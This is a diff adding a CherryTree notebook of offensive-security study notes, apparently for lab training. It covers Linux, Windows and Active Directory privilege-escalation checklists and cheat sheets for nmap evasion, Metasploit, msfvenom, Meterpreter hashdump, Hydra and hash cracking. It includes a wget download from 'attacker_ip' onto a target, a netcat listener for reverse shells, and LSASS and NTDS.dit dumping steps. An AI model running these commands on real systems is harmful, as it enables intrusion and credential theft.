@@ -1,0 +1,672 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node unique_id="2" master_id="0" name="LINUX" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512071">
+    <node unique_id="300" master_id="0" name="Linux Enumeration &amp; Privilege Escalation Procedures" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794513317" ts_lastsave="1794513575">
+      <rich_text scale="h1">Linux Enumeration &amp; Privilege Escalation</rich_text>
+      <rich_text>
+          
+</rich_text>
+      <rich_text scale="h2">Enumeration     </rich_text>
+      <rich_text>
+◇ Enumerate users and groups
+   ▪  List local users
+   ▪  List local groups
+   ▪  Currently logged on users
+   ▪  Last logins
+      - Check membership of interesting groups
+         •  </rich_text>
+      <rich_text family="monospace">wheel</rich_text>
+      <rich_text>
+         •  </rich_text>
+      <rich_text family="monospace">docker</rich_text>
+      <rich_text>
+         •  </rich_text>
+      <rich_text family="monospace">shadow</rich_text>
+      <rich_text>
+         •  </rich_text>
+      <rich_text family="monospace">lxc</rich_text>
+      <rich_text> and </rich_text>
+      <rich_text family="monospace">lxd</rich_text>
+      <rich_text>
+         •  </rich_text>
+      <rich_text family="monospace">disk</rich_text>
+      <rich_text>
+         •  </rich_text>
+      <rich_text family="monospace">adm</rich_text>
+      <rich_text>
+
+◇ Enumerate operating system information
+      →  Linux distribution
+      →  Kernel Version
+      →  Architecture (32 or 64 bit)
+      →  Is it AD domain joined?
+
+◇ Enumerate network information
+      →  IP addresses and network interfaces
+      →  List active connections and listening ports
+
+◇ Enumerate program and processes information
+
+
+</rich_text>
+      <rich_text scale="h2">Privilege Escalation     </rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text scale="h3">Global     </rich_text>
+      <rich_text>
+◇  Identify the Linux distribution and Kernel version
+◇  Check for credentials in web application configuration files
+◇  Check interesting directories (e.g. </rich_text>
+      <rich_text family="monospace">/opt</rich_text>
+      <rich_text>, </rich_text>
+      <rich_text family="monospace">/var/mail</rich_text>
+      <rich_text>, etc.)
+◇  Check capabilities
+◇  Check if </rich_text>
+      <rich_text family="monospace">sudo</rich_text>
+      <rich_text> version is vulnerable (</rich_text>
+      <rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22809">CVE-2023–22809</rich_text>
+      <rich_text>)
+◇  Internal Nmap scan
+◇  Check PwnKit
+◇  Check LogRotate (versions 3.8.8, 3.11.0, 3.15. and 3.18.0)
+◇  Monitor processes. Look for anything interesting.
+◇  Look for writable Docker socket files.
+◇  Look for Tmux sessions that can be hijacked
+◇  Check for NFS shares with </rich_text>
+      <rich_text family="monospace">no_root_squash</rich_text>
+      <rich_text> enabled
+◇  Check kernel exploits (e.g. DirtyCow, DirtyPipe)
+◇  Listen to traffic using TcpDump. Any cleartext credential?
+
+
+</rich_text>
+      <rich_text scale="h3">Per User     </rich_text>
+      <rich_text>
+◇  Check which groups user belongs to
+◇  Check </rich_text>
+      <rich_text family="monospace">sudo</rich_text>
+      <rich_text> rights
+◇  Check for environment variables
+◇  Look for ssh keys on home directory
+◇  Check for hidden files in home directory
+◇  Check history files on home directory
+◇  Hunt for interesting files
+◇  Enumerate SUID / GUID binaries
+◇ Check for exploitable cronjobs:
+      →  System-wide cronjobs
+      →  User-specific cronjobs
+      →  Monitor processes for regularly repeating commands, suggesting a hidden cron job.
+		
+◇  Try to read other user’s home directory (</rich_text>
+      <rich_text family="monospace">.ssh/id_rsa</rich_text>
+      <rich_text>, </rich_text>
+      <rich_text family="monospace">.bash_history</rich_text>
+      <rich_text>, etc.)
+◇  Try using user’s password for other users
+◇  Run </rich_text>
+      <rich_text family="monospace">linpeas.sh</rich_text>
+      <rich_text>
+
+
+  
+
+        
+      
+    
+          </rich_text>
+    </node>
+    <node unique_id="229" master_id="0" name="Linux Commands" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794513914">
+      <node unique_id="238" master_id="0" name="SSH" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512804">
+        <node unique_id="239" master_id="0" name="ssh name@ip" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794510692"/>
+        <node unique_id="240" master_id="0" name="scp path/to/file/you/wanna/transfer username@192.168.ip.address:/destination/path/on/other/machine" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794510692"/>
+      </node>
+    </node>
+    <node unique_id="289" master_id="0" name="DNS" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510746" ts_lastsave="1794513921">
+      <node unique_id="290" master_id="0" name="Record Types" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794511564" ts_lastsave="1794511577">
+        <rich_text>A  | Find IPv4 addresses
+AAAA | Find IPv6 addresses
+TXT | Find text records (api keys, tokens or flags)
+MX | Find mail servers
+CNAME | Find aliases to the IP (A records)
+NS | Find the name server of the domain
+any | everything from above (I suggest not using this, many dns servers block it) 
+
+Zone Transfer
+axfr | used to find private A and CNAME records linked to the NS domain (internal records)</rich_text>
+      </node>
+      <node unique_id="3" master_id="0" name="nslookup" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794511620">
+        <rich_text>nslookup (Name Server Lookup)
+		nslookup (FLAGS) {DOMAIN}
+		FLAGS
+			-type=PTR {IP} | reverse DNS lookup
+</rich_text>
+      </node>
+      <node unique_id="7" master_id="0" name="dig (DNS Lookup)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794511646">
+        <rich_text>dig (DNS Lookup)
+		dig (RECORD) {domain.com} @{IP}</rich_text>
+      </node>
+      <node unique_id="20" master_id="0" name="dnsenum (DNS subdomains enumeration)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512039">
+        <rich_text>dnsenum (DNS subdomains enumeration)
+		dnsenum -f {WORDLIST} --dnsserver {DNS_SERVER} {subdomain}.domain.com
+		FLAGS
+			-f | sets the wordlist for subdomains enum
+			-o | output file
+			-p | set Threads
+			-r | recursive, further enumerate the found subdomain
+</rich_text>
+      </node>
+    </node>
+    <node unique_id="291" master_id="0" name="IMAP, POP3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512071" ts_lastsave="1794512097">
+      <node unique_id="27" master_id="0" name="openssl (imap,pop3 connection)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512102">
+        <rich_text>openssl (imap,pop3 connection)
+		openssl s_client -connect {IP}:IMAPS or pop3s</rich_text>
+      </node>
+    </node>
+    <node unique_id="292" master_id="0" name="SNMP" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512138" ts_lastsave="1794512138">
+      <node unique_id="29" master_id="0" name="snmpwalk" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512147">
+        <rich_text>snmpwalk
+		snmpwalk (FLAGS) -c {community_string} {IP}
+		FLAGS
+			-v 1|2c|3 	| sets version of snmp
+			-u user 	| username for v3
+			-a MD5|SHA	| Authentication Protocol for v3
+			-A {authphrase} | Authentication passphrase for v3
+</rich_text>
+      </node>
+      <node unique_id="36" master_id="0" name="onesixtyone (Community Strings SNMP)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512158">
+        <rich_text>onesixtyone (Community Strings SNMP)
+		onesixtyone -c {Wordlist} {IP}
+		if a string is found, it will be in brackets like [public]</rich_text>
+      </node>
+    </node>
+    <node unique_id="293" master_id="0" name="RPC" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512187" ts_lastsave="1794512187">
+      <node unique_id="39" master_id="0" name="RPCclient (MSRPC Administration tool)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512225">
+        <rich_text>RPCclient (MSRPC Administration tool)
+		rpcclient (FLAGS) {IP}
+			-U "domain/username%password"| to log in as a user (can leave blank if share isn't secured)
+
+		AFTER CONNECTING
+			srvinfo | display Server information
+			enumdomains | enumerate all domains in the network
+			querydominfo | provides domain, server and user information of deployed domains
+			netshareenumall | enumerate all available shares
+			netsharegetinfo &lt;share&gt; | provides info about a specific share
+			enumdomusers | enum all domain users
+			queryuser &lt;RID&gt; | provides info about a specific user
+</rich_text>
+      </node>
+    </node>
+    <node unique_id="294" master_id="0" name="SMB (Folder/File sharing)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512253" ts_lastsave="1794512378">
+      <node unique_id="50" master_id="0" name="SMBclient (SMB)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512255">
+        <rich_text>SMBclient (SMB)
+		smbclient //{ip_address}/{SHARE} (FLAGS)
+		FLAGS
+			-N | null session, this lets you anonymously connect to a target's SMB share.
+			-L | lists all the server's shares
+			-U USER | Authenticate as user
+		
+		after connecting
+			!&lt;cmd&gt; to execute local system commands
+			help | to get all the commands you can run</rich_text>
+      </node>
+      <node unique_id="59" master_id="0" name="mount (NFS, mounts)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512317">
+        <rich_text>mount (NFS, mounts)
+		showmount (FLAGS) {IP}
+		FLAGS
+			-e | list all shares
+			-a | show client names and mounted directories
+			-d | show only directories the user uses
+			-v | verbose output (version grabbing)
+	
+		mkdir target_nfs
+		
+		sudo mount -t nfs -o nolock {IP}:/share ./target_nfs
+		FLAGS
+			-t nfs | mount as NFS
+			-o nolock | disables file locking
+</rich_text>
+      </node>
+    </node>
+    <node unique_id="295" master_id="0" name="Exploits" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512396" ts_lastsave="1794512396">
+      <node unique_id="71" master_id="0" name="Reverse Shells / File Transfer" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512413">
+        <rich_text>Reverse Shells / File Transfer
+		python3 -m http.server 9000
+			wget </rich_text>
+        <rich_text link="webs http://attacker_ip:9000/file_path">http://attacker_ip:9000/file_path</rich_text>
+        <rich_text> to download file to remote pc
+
+		Execute ELF:
+			chmod +x {FILE}
+			./path_to_file to run the .elf file
+</rich_text>
+      </node>
+      <node unique_id="77" master_id="0" name="Msfvenom" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512435">
+        <rich_text>Msfvenom
+		msfvenom (FLAGS)
+		FLAGS
+			-l payloads/encoders 	| lists all payloads/encoders
+			-p {payload} 		| specifies payload to use
+			-f 			| specifies format of the payload
+			-e 			| encodes the payload to avoid IDS and obsfucates
+			-o 			| outputs to file
+</rich_text>
+      </node>
+      <node unique_id="85" master_id="0" name="Metasploit" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512460">
+        <rich_text>Metasploit
+		msfconsole to enter
+		use {MODULE} 		| to enter exploit module
+		show options 		| to show all parameters available to be set
+		set {parameter} {value} | sets parameter in the exploit youre in. Resets upon leaving. (can also set files as values from host pc)
+			setg		| to set parameters for all other modules if using the same parameter.
+			unset all/payload
+			unsetg xyz
+
+		info {exploit} 		| detailed informations about exploit
+		exploit/run 		| run the exploit
+			-z 		| run it in the background
+			ctrl z / "background" in meterpreter
+
+		sessions to show background connections
+			-i {x-z} to select the session
+			-k {id} to kill or leave id to kill all
+			
+		back 			| exit exploit
+ 		search (FLAG)
+		FLAGS
+			type:value (exploit, payload, auxiliary, encoder, evasion, post, nop)
+			name:value
+			platform:value (windows, linux etc...)
+			cve:CVE-XXXX-XXXX
+</rich_text>
+      </node>
+      <node unique_id="107" master_id="0" name="Meterpreter" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512522">
+        <rich_text>Meterpreter
+		help			| lists all the commands
+		guid 			| gets the GUID of the session
+		search -f {file_string} | used to find files
+		hashdump 		| dumps all the hashes in the SAM
+		getuid 			| display user privileges and rights
+		ps 			| to display all processes.
+		migrate {process_id} 	| to migrate to a process (useful for keystroke scan on certain apps like Excel, Word etc...)
+		use "xyz" when refering to paths</rich_text>
+      </node>
+      <node unique_id="296" master_id="0" name="Bruteforce" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512621" ts_lastsave="1794512625">
+        <node unique_id="116" master_id="0" name="Hydra" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512623">
+          <rich_text>Hydra
+		hydra (FLAGS) {IP} 
+		FLAGS
+			-l &lt;username&gt; sets the user for login
+			-P &lt;/Wordlist/path&gt; to set the password wordlist
+			-t xzy sets the threads to spawn
+		service
+			ssh to set SSH login
+
+		Web Forms
+			sudo hydra -l -p {IP} http-post-form "loginURL:username=^USER^&amp;password=^PASS^:F=incorrect"</rich_text>
+        </node>
+        <node unique_id="126" master_id="0" name="John The Ripper" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512637">
+          <rich_text>John The Ripper
+		unshadow /etc/passwd /etc/shadow &gt; unshadowed.txt
+			passwd 		| clear readable general user data
+			shadow 		| is where password hashes are stored, needs admin privs.
+
+		john (FLAGS) (file to crack path)
+		FLAGS
+			--wordlist={WORDLIST}
+			--format={HASH_FORMAT} 
+				--list=formats to find out what formats john supports
+			--single single cracking mode
+
+		CONVERSION TOOLS
+		zip2john file.zip &gt; hash.txt
+		rar2john file.rar &gt; hash.txt
+		ssh2john id_rsa   &gt; hash.txt
+</rich_text>
+        </node>
+        <node unique_id="140" master_id="0" name="Hashcat" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512682">
+          <rich_text>Hashcat
+		hashcat -m {MODE} -a {ATTACK} {HASHFILE} {WORDLIST}
+		FLAGS
+			-m specifies the hashtype in numeric format, e.g -m 1000 is NTLM. use man hashcat for more codes.
+			-a specifies the attackmode, -a 0 = 1 password after the other from the wordlist
+		EXAMPLE
+			hashcat -m 1000 -a 0 hashes.txt rockyou.txt
+</rich_text>
+          <node unique_id="147" master_id="0" name="Hashes" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512737">
+            <rich_text>md5sum {file}
+		sha1sum
+		sha256sum
+		sha512sum
+			outputs the hash as a hexadecimal
+		
+		generally passwords are saved as hashes not as cleartext. The password entered gets converted to a hash and 	compared to the hash saved. Hashes are very hard to reverse engineer so its way safer than just storing cleartext passwords.
+		You can salt hashes by adding a string to the original cleartext before it gets hashed which changes the hash drastically
+		Linux stores these password hashes in /etc/shadow only readable by root. Line contains 9 fields seperated by :
+		Password fields are saved in this format $prefix$options$salt$hash
+		prefix determines the encryption hashing scheme
+</rich_text>
+          </node>
+        </node>
+      </node>
+    </node>
+    <node unique_id="297" master_id="0" name="Network" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512778" ts_lastsave="1794512778">
+      <node unique_id="157" master_id="0" name="Netcat, ncat (Banner grabbing / Reverse bind shells)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794513555">
+        <rich_text>Netcat, ncat (Banner grabbing / Reverse bind shells)
+		nc (FLAGS) {IP} {PORT}
+		FLAGS
+			-l | Listening mode for incoming connections
+			-z | Port scanning
+			-u | uses UDP
+			-v | verbose mode
+			-n | don't resolve IP addresses
+
+		EXAMPLE
+			nc -lnvp 4444
+</rich_text>
+      </node>
+      <node unique_id="194" master_id="0" name="NMap" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512945">
+        <rich_text>NMap
+		nmap (IP)/24 (FLAGS) (SCRIPTS)
+		FLAGS
+			-sn 				| ping scan host (no ports, only active hosts)
+			-sL 				| List Target IPs/names
+			-sT 				| TCP connect, complete Handshake
+			-sS 				| stealth scan, only 1st step of Handshake
+			-sU 				| UDP scan
+			-F 				| scans only 100 most common ports (instead of 1000)
+			-pX-Y 				| scans ports from x to y. -p- scans EVERY port.
+			-O 				| OS detection (isn't always reliable)
+			-sV 				| Service Version scan
+			-A 				| O &amp; sV together plus other things
+			-Pn 				| treat every Host as online and force scan.
+			-v 				| verbosity level (-v or -vv)
+			-oN {FILENAME} 			| saves as normal output
+			-oG 				| GREPable output
+			-D RND:xyz 			| to set up decoy IP adresses. Your IP will be put in that pool of 							  random IP Adresses. Combine it with a proxy.
+
+			--disable-arp-ping 		| to disable arp pinging. This is better at evading EDRs as it 								  forces a L3 ping and does not come across as a high frequency 							  ping sweep/tcp request
+
+			--source-port xyz 		| to force nmap to send traffic from the chosen port
+			--data-length xyz 		| adds a random extra data to the packet frame so they do not look 							  like standard nmap probes (some EDRs look into it)
+		TIMINGS
+			-T0 paranoid 9.8h for 100 most common ports (5 min between each port)
+			-T1 sneaky 27.53 min for 100p (15 sec between every 2 ports)
+			-T2 polite 40.56 sec for 100p (0.4 sec for every port)
+			-T3 normal 0.15 sec for 100p
+			-T4 aggressive 0.13 sec for 100p
+		SCRIPTS (categories)
+			Needs to always start with --script xyz
+			auth 				| Determination of authentication credentials.
+			brute 				| Executes scripts that try to log in to the respective service by 							  brute-forcing with credentials.
+			discovery 			| Evaluation of accessible services.
+			exploit 			| This category of scripts tries to exploit known vulnerabilities 							  for the scanned port.
+
+			version 			| Extension for service detection.
+			vuln 				| Identification of specific vulnerabilities.
+</rich_text>
+      </node>
+      <node unique_id="241" master_id="0" name="Telnet" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512990">
+        <rich_text>Telnet
+		Telnet (ip) (port)
+		GET /{file} HTTP/1.1
+		Host: xyz (optional)
+</rich_text>
+      </node>
+      <node unique_id="245" master_id="0" name="TCPDump" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794513004">
+        <rich_text>TCPDump
+		ip a s
+		sudo tcpdump (FILTERS) (FLAGS)
+		FILTERS
+			host {IP}				| Limit TO &amp; FROM {IP} host
+			port {PORT} 				| Limit TO &amp; FROM {PORT} port
+			src xyz host/port 			| Limit FROM xyz host/port
+			dst xyz host/port			| Limit TO xyz host/port
+			Protocol IP, IP6, UDP, TCP, ICMP or ARP | Limits the search for this protocol
+	
+			and 					| Captures packets where both conditions are true
+			or 					| Captures packets when one conditions is true
+			not 					| Captures packets when the condition is not true
+		FLAGS
+			-i eth interface
+			-w save to file
+			-r read from file
+			-c Limit sniffs to certain count
+			-n dont resolve ip -nn dont resolve protocols
+			-v -vv -vvv verbosity</rich_text>
+      </node>
+    </node>
+    <node unique_id="298" master_id="0" name="Web" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512845" ts_lastsave="1794512845">
+      <node unique_id="167" master_id="0" name="Whatweb" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512913">
+        <rich_text>Whatweb
+		whatweb {IP}
+			to find out what kind of server a website uses if nc banner grabbing doesn't work
+</rich_text>
+      </node>
+      <node unique_id="170" master_id="0" name="Gobuster" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512923">
+        <rich_text>Gobuster
+		gobuster (FLAGS)
+		FLAGS
+			--help
+			dir to use directory/file enumeration mode
+				-u {URL} 			| to set the target
+				-w {WORDLIST}			| to set the wordlist
+				-t 				| to set the threads used
+				-r 				| to redirect you to moved urls
+				-x .extension 			| to find files with these extensions
+				-o {File} 			| to output the results into a file
+
+			dns to use subdomain enumeration
+				-c 				| show CNAME records (can't use with -i flag)
+				-i 				| shows ip addresses that the domain and subdomain resolve
+				-d 				| for the domain you want to enumerate
+
+			vhost to brute force virtual hosts (different websites hosted on the same host)
+				-u {URL} 			| to set the target
+				--domain {2nd &amp; 3rd lvl Domain} | to set the domain if set with IP
+				--append-domain 		| to add the set domain to every entry to not get false 								  positives
+				--exclude-length x-y 		| to ignore certain status codes that don't interest us
+				-m 				| to set the http method (GET, POST)
+				-r 				| follow redirects
+		EXAMPLE
+			gobuster dir -u inlanefreight.htb -w rockyou.txt -r
+</rich_text>
+      </node>
+    </node>
+    <node unique_id="264" master_id="0" name="MySQL" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794513021">
+      <rich_text>MySQL
+		mysql (FLAGS) {IP}
+		FLAGS
+			-u &lt;user&gt;
+			-p&lt;password&gt; | no space inbetween "-p" flag and password!
+			-h {IP}
+</rich_text>
+    </node>
+  </node>
+  <node unique_id="277" master_id="0" name="WINDOWS" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794513743">
+    <node unique_id="299" master_id="0" name="Active Directory Procedures" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794513156" ts_lastsave="1794513661">
+      <rich_text scale="h1">Active Directory Compromise</rich_text>
+      <rich_text>
+
+ 
+</rich_text>
+      <rich_text scale="h2">Live Host Enumeration     </rich_text>
+      <rich_text>
+◇  Conduct a ping sweep on the IP range
+◇  Use NetExec on the IP range (better information)
+◇  Use Responder to catch IP addresses
+
+  Note
+      Be sure to properly understand the role of each host. Do your service enumeration.
+
+
+</rich_text>
+      <rich_text scale="h2">User Enumeration     </rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text weight="heavy">With foothold</rich_text>
+      <rich_text>
+◇  Get user list via SMB
+
+</rich_text>
+      <rich_text weight="heavy">Without foothold</rich_text>
+      <rich_text>
+◇  Attempt to get user list via SMB Null Authentication
+◇  Attempt to get user list via LDAP Anonymous Bind
+◇  Attempt to get user list via RPCClient
+◇  Attempt to get user list via RID brute-forcing
+◇  Attempt to get user list via Kerbruting
+
+  Warning
+      Some of these techniques are not guaranteed to discover all users. At least try the SMB, LDAP, RPCClient and RID methods.
+
+
+</rich_text>
+      <rich_text scale="h2">Get Foothold     </rich_text>
+      <rich_text>
+◇  Find Kerberoastable users from the user list
+◇  Find ASREProastable users from the user list
+◇  Use Responder to catch credential hashes
+◇  Try SMB Null Authentication to spider through SMB shares looking for credentials
+◇  Get </rich_text>
+      <rich_text family="monospace">SYSTEM</rich_text>
+      <rich_text> / </rich_text>
+      <rich_text family="monospace">root</rich_text>
+      <rich_text> on Domain connected host to get a Computer account
+◇  As a last resource, try password spraying with the user list
+
+  Caution
+      Password spraying can lock accounts due to repeated failed attempts and should be used cautiously.
+
+
+</rich_text>
+      <rich_text scale="h2">Attacks     </rich_text>
+      <rich_text>
+◇  Use SharpHound to collect data to feed BloodHound
+◇  Check compromised hosts on BloodHound for outbound attack paths
+◇  Use NetExec to check for command execution via SMB, WinRM, and RDP for each compromised user.
+◇  Kerberoast
+◇  ASREProast
+◇ Kerberos Delegation Attacks
+      → Unconstrained Delegation
+      →  Constrained Delegation
+      →  Resource-Based Constrained Delegation
+
+◇  Misconfigured certificate service
+◇  Look for credentials in GPOs (</rich_text>
+      <rich_text family="monospace">gpp_password</rich_text>
+      <rich_text>, </rich_text>
+      <rich_text family="monospace">autologin</rich_text>
+      <rich_text>)
+◇  For each compromised user, spider through readable SMB shares for sensitive information
+◇  For each compromised user, conduct SMB Hash Theft attacks on writable SMB shares
+◇  Look for passwords in user’s description fields
+◇  Check the DC’s SYSVOL SMB share for scripts containing credentials
+◇  </rich_text>
+      <rich_text link="webs https://github.com/cube0x0/CVE-2021-1675">NoPac</rich_text>
+      <rich_text>
+◇  </rich_text>
+      <rich_text link="webs https://github.com/m8sec/CVE-2021-34527">PrintNightmare</rich_text>
+      <rich_text>
+◇  </rich_text>
+      <rich_text link="webs https://github.com/topotam/PetitPotam">PetitPotam</rich_text>
+      <rich_text>
+◇  Try compromised local administrator hashes on other hosts
+◇  Try Responder on different hosts
+◇  Look for users with the </rich_text>
+      <rich_text family="monospace">PASSWD_NOTREQD</rich_text>
+      <rich_text> field
+◇  Password spray using previously found passwords
+
+        
+      
+    
+          </rich_text>
+    </node>
+    <node unique_id="301" master_id="0" name="Windows Enumeration &amp; Privilege Escalation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794513743" ts_lastsave="1794513904">
+      <rich_text scale="h1">Windows Enumeration &amp; Privilege Escalation</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text scale="h2">Enumeration </rich_text>
+      <rich_text>
+• Enumerate users and groups
+      → List local users
+      →  List local groups
+      →  Check membership of interesting groups▪  Local Administrator
+         ⇒  Remote Desktop Users (RDP access)
+         ⇒  Remote Management Users (WinRM access)
+
+
+• Enumerate operating system information
+     →  Windows version and </rich_text>
+      <rich_text link="webs https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions">build number</rich_text>
+      <rich_text>
+     →  Architecture (32 or 64 bit)
+
+
+• Enumerate network information
+     →  IP addresses and network interfaces
+     →  List active connections and listening ports
+
+
+• Enumerate program and processes information
+     →  List all installed applications and services
+     →  Look at processes for any running applications that are not installed
+
+•  Enumerate security features
+
+
+</rich_text>
+      <rich_text scale="h2">Privilege Escalation </rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text scale="h3">Global </rich_text>
+      <rich_text>
+◇  Try </rich_text>
+      <rich_text link="webs https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">WinPEAS</rich_text>
+      <rich_text>
+◇ Look for vulnerable services▪  Services with weak executable permissions
+     →  Services where we can alter the executable path
+     →  Unquoted service paths
+     →  Services prone to DLL hijacking
+		
+◇  Check if </rich_text>
+      <rich_text family="monospace">AlwaysInstallElevated</rich_text>
+      <rich_text> is enabled.
+◇  Search for CVEs in installed programs.
+◇  See if there are known exploits for the Windows version.
+
+
+</rich_text>
+      <rich_text scale="h3">Per User </rich_text>
+      <rich_text>
+◇  Check user’s privileges
+◇  Check which groups user belongs to
+◇  Look for secrets in shell environment variables
+◇  Hunt for credentials
+◇  Look for Unquoted Service Paths
+◇  Look for exploitable Scheduled Tasks
+◇  Try planting malicious SCF and LINK files on writeable SMB shares.
+
+
+</rich_text>
+      <rich_text scale="h3">After Administrator </rich_text>
+      <rich_text>
+◇ Dump secrets▪  Get credentials using LaZagne
+     →  Dump SAM &amp; LSA
+     →  Dump LSASS memory
+     →  Dump </rich_text>
+      <rich_text family="monospace">NTDS.dit</rich_text>
+      <rich_text> (if Domain Controller)
+
+
+
+</rich_text>
+    </node>
